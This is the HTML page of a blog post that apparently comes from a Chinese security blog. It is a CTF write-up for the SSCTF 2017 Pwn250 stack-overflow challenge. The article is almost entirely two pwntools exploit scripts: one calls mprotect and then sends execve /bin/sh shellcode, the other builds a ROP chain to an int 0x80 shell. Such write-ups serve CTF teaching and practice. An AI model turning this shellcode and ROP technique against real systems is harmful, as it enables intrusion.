@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="除了杂项 就只会做这个了~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017- SSCTF-Pwn250">
+<meta property="og:url" content="https://bestwing.me/2017-SSCTF-Pwn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="除了杂项 就只会做这个了~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02">
+<meta property="article:published_time" content="2017-05-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-02-16T16:58:08.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="SSTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2017- SSCTF-Pwn250</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/How-to-patch-fmt.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017-defcon-peROPdo.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-SSCTF-Pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-SSCTF-Pwn.html&text=2017- SSCTF-Pwn250"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-SSCTF-Pwn.html&is_video=false&description=2017- SSCTF-Pwn250"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017- SSCTF-Pwn250&body=Check out this article: https://bestwing.me/2017-SSCTF-Pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-SSCTF-Pwn.html&name=2017- SSCTF-Pwn250&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-SSCTF-Pwn.html&t=2017- SSCTF-Pwn250"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2017- SSCTF-Pwn250
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-05-06T16:00:00.000Z" itemprop="datePublished">2017-05-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SSTF/" rel="tag">SSTF</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>漏洞很简单，栈溢出，如下：</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png"></p>
+<p>方法一：     mprotect 传shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">	DEBUG = <span class="number">1</span> </span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	DEBUG = <span class="number">0</span></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./250&#x27;</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(io,&#x27;#b main&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806E070</span></span><br><span class="line">main_addr = <span class="number">0x08048886</span></span><br><span class="line">read = <span class="number">0x0806D510</span></span><br><span class="line">stack = <span class="number">0x08049000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">prop = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">	io.sendline(<span class="string">&#x27;82&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">	payload1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(mprotect)+p32(main_addr)+p32(stack)+p32(size)+p32(prop)	</span><br><span class="line">	io.send(payload1)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">	io.sendline(<span class="string">&#x27;90&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">	shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line">	ssize = len(shellcode)</span><br><span class="line">	payload2 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(read)+p32(stack)+p32(<span class="number">0</span>)+p32(stack)+p32(ssize)+<span class="string">&#x27;THE END!&#x27;</span></span><br><span class="line">	io.send(payload2)</span><br><span class="line">	<span class="comment">#io.recvuntil(&#x27;THE END!&#x27;)</span></span><br><span class="line">	raw_input(<span class="string">&#x27;send?&#x27;</span>)</span><br><span class="line">	io.send(shellcode)</span><br><span class="line">	io.interactive()</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02"></p>
+<p>int 80 起shell   by pxx</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">io</span>):</span></span><br><span class="line">    io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">	dl_mk_stack_exe = <span class="number">0x080A0AF0</span></span><br><span class="line"></span><br><span class="line">	context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">	shellcode = asm(shellcraft.i386.sh())</span><br><span class="line"></span><br><span class="line">	<span class="comment">#0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret</span></span><br><span class="line">	add_ebx_esp = <span class="number">0x080e77dc</span></span><br><span class="line">	<span class="comment">#0x080481c9 : pop ebx ; ret</span></span><br><span class="line">	p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">	<span class="comment">#0x0804f2ea : mov eax, ebx ; pop ebx ; ret</span></span><br><span class="line">	mov_eax_ebx_p_ret = <span class="number">0x0804f2ea</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#0x0806cbb5 : int 0x80</span></span><br><span class="line">	p_eax_ret = <span class="number">0x080b89e6</span></span><br><span class="line">	p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">	p_ecx_ret = <span class="number">0x080df1b9</span></span><br><span class="line">	p_edx_ret = <span class="number">0x0806efbb</span></span><br><span class="line">	int80_addr = <span class="number">0x0806cbb5</span></span><br><span class="line"></span><br><span class="line">	read_addr = <span class="number">0x0806D510</span></span><br><span class="line">	bss_addr = <span class="number">0x080ece00</span></span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x3a</span></span><br><span class="line">	payload += l32(<span class="number">0</span>)</span><br><span class="line">	payload += gen_rop_data(read_addr, [<span class="number">0</span>, bss_addr, <span class="number">8</span>])</span><br><span class="line">	payload += l32(p_eax_ret)</span><br><span class="line">	payload += l32(<span class="number">0xb</span>)</span><br><span class="line">	payload += l32(p_ebx_ret)</span><br><span class="line">	payload += l32(bss_addr)</span><br><span class="line">	payload += l32(p_ecx_ret)</span><br><span class="line">	payload += l32(<span class="number">0</span>)</span><br><span class="line">	payload += l32(p_edx_ret)</span><br><span class="line">	payload += l32(<span class="number">0</span>)</span><br><span class="line">	payload += l32(int80_addr)</span><br><span class="line"></span><br><span class="line">	io.writeline(str(<span class="number">1000</span>))</span><br><span class="line">	io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">	io.gdb_hint()</span><br><span class="line">	io.writeline(payload)</span><br><span class="line">	io.read_until(<span class="string">&quot;]&quot;</span>)	</span><br><span class="line"></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	io.writeline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">	io.interact()</span><br><span class="line"></span><br><span class="line">	io.interact()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-SSCTF-Pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-SSCTF-Pwn.html&text=2017- SSCTF-Pwn250"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-SSCTF-Pwn.html&is_video=false&description=2017- SSCTF-Pwn250"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017- SSCTF-Pwn250&body=Check out this article: https://bestwing.me/2017-SSCTF-Pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-SSCTF-Pwn.html&title=2017- SSCTF-Pwn250"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-SSCTF-Pwn.html&name=2017- SSCTF-Pwn250&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-SSCTF-Pwn.html&t=2017- SSCTF-Pwn250"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
